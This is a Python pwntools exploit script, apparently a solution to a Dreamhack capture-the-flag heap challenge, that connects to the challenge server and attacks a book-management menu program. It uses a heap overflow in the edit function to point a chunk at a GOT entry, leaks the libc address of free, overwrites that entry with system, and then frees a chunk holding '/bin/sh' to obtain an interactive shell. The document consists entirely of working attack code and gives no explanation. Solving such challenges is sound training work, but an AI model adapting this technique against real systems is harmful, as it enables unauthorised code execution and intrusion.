#!/usr/bin/env python3

from pwn import *

exe = ELF('./prob_patched')
libc = ELF('./libc-2.31.so')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def register(no, price, author, title):
	sla(b"Menu: ", b"1")
	sla(b"No.:", f"{no}".encode())
	sla(b"Price: ", f"{price}".encode())
	sla(b"Author: ", author)
	sla(b"Title: ", title)

def book(index, which):
	sla(b"Menu: ", b"2")
	sla(b"Index: ", f"{index}".encode())
	sla(b"Info?: ", f"{which}".encode())

def delete(index):
	sla(b"Menu: ", b"3")
	sla(b"Index: ", f"{index}".encode())

def edit(index, which, data):
	sla(b"Menu: ", b"4")
	sla(b"Index: ", f"{index}".encode())
	sla(b"Info?: ", f"{which}".encode())
	if(which > 2):
		sla(b"Data: ", data)
	else:
		sla(b"Data: ", f"{data}".encode())

script = '''
'''

p = remote("host1.dreamhack.games", 12491)
#p = process('./prob_patched')
#p = gdb.debug('./prob_patched', gdbscript = script)

sla(b"name?: ", b"A" * 8)

register(0, 0, b"0" * 8, b"0" * 8)
register(1, 1, b"1" * 8, b"/bin/sh\x00")
edit(0, 4, b"0" * 0x38 + p64(0x31) + p64(1) + p64(1) + p64(0x404018)[:7:])
delete(0)
book(1, 3)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['free']
lleak("libc_base", libc_base)
system = libc_base + libc.symbols['system']
#debug()
edit(1, 3, p64(system)[:7:])
delete(1)

p.interactive()
